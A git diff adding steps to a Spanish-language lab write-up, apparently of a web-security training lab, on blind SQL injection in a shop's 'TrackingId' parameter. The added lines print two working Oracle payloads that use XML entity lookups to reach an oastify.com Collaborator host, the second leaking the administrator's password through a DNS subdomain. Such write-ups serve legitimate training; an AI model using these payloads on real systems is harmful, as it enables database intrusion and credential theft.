@@ -25,6 +25,21 @@ Objetivos:
 Iniciamos el laboratorio y nos encontramos con un shop online, el cual tiene el parámetro `TrackingId` vulnerable:
 <img width="1506" height="781" alt="image" src="https://github.com/user-attachments/assets/63f4a52e-704f-40d9-b43c-afb3aee2f0bb" />
 
+Obtenemos nuestro cliente Collaborator: `ibxpii8obs96pxojmvp46wjkpbv2jt7i.oastify.com`
+
+Podemos utilizar el payload del laboratorio anterior para realizar un DNS lookup:
+```sql
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3lpas3i9ldjrziy4wgzpght5zw5ntdh2.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+```
+Vemos que obtenemos peticiones a nuestro Collaborator, por lo que confirmamos que nos encontramos ante un motor Oracle.
+
+Utilizamos nuestro SQLi Cheat sheet y e inyectamos el payload para exfiltrar data correspondiente a Oracle:
+
+
+```sql
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.ibxpii8obs96pxojmvp46wjkpbv2jt7i.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+```
+
 
 
 
